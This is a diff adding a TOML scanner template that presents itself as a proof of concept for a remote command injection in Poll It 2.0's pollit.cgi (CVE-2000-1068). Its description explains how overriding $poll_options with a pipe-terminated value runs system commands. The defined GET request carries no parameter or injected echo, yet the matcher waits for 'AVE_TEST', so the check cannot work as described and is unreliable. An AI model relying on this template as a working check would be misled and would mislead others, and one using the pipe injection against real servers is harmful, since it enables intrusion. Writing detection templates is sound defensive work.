@@ -1,0 +1,32 @@
+[info]
+author = "AVE"
+description = 'Poll It 2.0 的 pollit.cgi 中 ReadForm 函数在内部变量定义后调用，导致攻击者可通过 CGI 参数覆盖 $poll_options 变量。open(COPTIONS,"$poll_options") 因缺少文件操作符前缀，当值以管道符 | 结尾时执行任意系统命令。发送 GET 请求并注入 echo 命令，响应体中若出现回显内容则证明漏洞存在。'
+id = "POC-AVE-2000-1986"
+name = "Poll It 2.0 pollit.cgi 远程命令注入 PoC"
+severity = "critical"
+tags = ["ave-2000-1986"]
+vuln_id = [
+    "CVE-2000-1068",
+    "AVE-2000-1986",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/pollit.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["AVE_TEST"]
